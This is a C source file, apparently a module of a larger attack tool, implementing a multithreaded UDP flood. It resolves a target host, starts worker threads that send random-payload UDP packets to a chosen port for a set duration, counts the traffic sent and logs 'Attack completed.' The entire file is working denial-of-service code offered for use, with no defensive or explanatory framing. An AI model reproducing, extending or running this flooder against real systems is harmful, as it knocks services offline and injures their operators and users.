#include "udp_flood.h"
#include "../config.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef _WIN32
#pragma comment(lib, "ws2_32.lib")
#define close_socket closesocket
#define usleep_ms(ms) Sleep(ms)
#else
#include <errno.h>
#define close_socket close
#define usleep_ms(ms) usleep((ms) * 1000)
#define SOCKET int
#define INVALID_SOCKET (-1)
#define SOCKET_ERROR   (-1)
#endif

static double get_time(void)
{
#ifdef _WIN32
    LARGE_INTEGER freq, counter;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&counter);
    return (double)counter.QuadPart / (double)freq.QuadPart;
#else
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return ts.tv_sec + ts.tv_nsec / 1e9;
#endif
}

static void udp_flood_log(udp_flood_t *ctx, const char *message)
{
    if (ctx->callback) {
        ctx->callback(message);
    } else {
        printf("[UDP Flood] %s\n", message);
    }
}

int udp_flood_init(udp_flood_t *ctx, const char *target, int duration,
                   int threads, int port, int packet_size,
                   udp_flood_callback_t callback)
{
    memset(ctx, 0, sizeof(*ctx));
    ctx->duration    = duration;
    ctx->threads     = threads;
    ctx->port        = port;
    ctx->packet_size = (packet_size > MAX_UDP_PAYLOAD) ? MAX_UDP_PAYLOAD : packet_size;
    ctx->callback    = callback;
    ctx->stop_flag   = 0;
    pthread_mutex_init(&ctx->stats.lock, NULL);

    /* Strip protocol prefix if present */
    {
        const char *host = target;
        if (strncmp(host, "http://", 7) == 0)  host += 7;
        if (strncmp(host, "https://", 8) == 0) host += 8;
        snprintf(ctx->target, sizeof(ctx->target), "%s", host);
        char *slash = strchr(ctx->target, '/');
        if (slash) *slash = '\0';
    }

    /* Resolve target IP */
    {
        struct addrinfo hints, *res;
        memset(&hints, 0, sizeof(hints));
        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_DGRAM;
        if (getaddrinfo(ctx->target, NULL, &hints, &res) != 0) {
            snprintf(ctx->target_ip, sizeof(ctx->target_ip), "%s", ctx->target);
        } else {
            struct sockaddr_in *addr = (struct sockaddr_in *)res->ai_addr;
            inet_ntop(AF_INET, &addr->sin_addr, ctx->target_ip, sizeof(ctx->target_ip));
            freeaddrinfo(res);
        }
    }

    return 0;
}

static void *udp_flood_worker(void *arg)
{
    udp_flood_t *ctx = (udp_flood_t *)arg;
    unsigned char *payload;
    struct sockaddr_in dest;

    payload = (unsigned char *)malloc(ctx->packet_size);
    if (!payload) return NULL;

    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_port = htons(ctx->port);
    inet_pton(AF_INET, ctx->target_ip, &dest.sin_addr);

    while (!ctx->stop_flag) {
        SOCKET sock;
        int i;

        sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock == INVALID_SOCKET) {
            usleep_ms(1);
            continue;
        }

#ifdef _WIN32
        DWORD timeout_val = 2000;
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char *)&timeout_val, sizeof(timeout_val));
#else
        struct timeval tv;
        tv.tv_sec = 2;
        tv.tv_usec = 0;
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
#endif

        /* Generate random payload */
        for (i = 0; i < ctx->packet_size; i++) {
            payload[i] = (unsigned char)(rand() % 256);
        }

        if (sendto(sock, (const char *)payload, ctx->packet_size, 0,
                   (struct sockaddr *)&dest, sizeof(dest)) != SOCKET_ERROR) {
            pthread_mutex_lock(&ctx->stats.lock);
            ctx->stats.packets_sent++;
            ctx->stats.bytes_sent += ctx->packet_size;
            pthread_mutex_unlock(&ctx->stats.lock);
        }

        close_socket(sock);
        usleep_ms(1);
    }

    free(payload);
    return NULL;
}

udp_flood_stats_t udp_flood_run(udp_flood_t *ctx)
{
    char msg[512];
    pthread_t *workers;
    int i;

    ctx->stats.start_time = get_time();
    ctx->stop_flag = 0;

    snprintf(msg, sizeof(msg), "Starting UDP Flood on %s (%s):%d",
             ctx->target, ctx->target_ip, ctx->port);
    udp_flood_log(ctx, msg);
    snprintf(msg, sizeof(msg), "Duration: %ds | Threads: %d | Packet Size: %d",
             ctx->duration, ctx->threads, ctx->packet_size);
    udp_flood_log(ctx, msg);

    workers = (pthread_t *)malloc(sizeof(pthread_t) * ctx->threads);
    if (!workers) {
        udp_flood_log(ctx, "Error: Failed to allocate thread array");
        return ctx->stats;
    }

    for (i = 0; i < ctx->threads; i++) {
        pthread_create(&workers[i], NULL, udp_flood_worker, ctx);
    }

    /* Run for specified duration */
    {
        double end_time = get_time() + ctx->duration;
        while (get_time() < end_time && !ctx->stop_flag) {
            usleep_ms(100);
        }
    }

    udp_flood_stop(ctx);

    for (i = 0; i < ctx->threads; i++) {
        pthread_join(workers[i], NULL);
    }
    free(workers);

    ctx->stats.end_time = get_time();

    {
        double mb_sent = ctx->stats.bytes_sent / (1024.0 * 1024.0);
        snprintf(msg, sizeof(msg),
                 "Attack completed. Packets: %lld | Data: %.2f MB",
                 ctx->stats.packets_sent, mb_sent);
        udp_flood_log(ctx, msg);
    }

    return ctx->stats;
}

void udp_flood_stop(udp_flood_t *ctx)
{
    ctx->stop_flag = 1;
    udp_flood_log(ctx, "Stop signal received");
}

void udp_flood_destroy(udp_flood_t *ctx)
{
    pthread_mutex_destroy(&ctx->stats.lock);
}
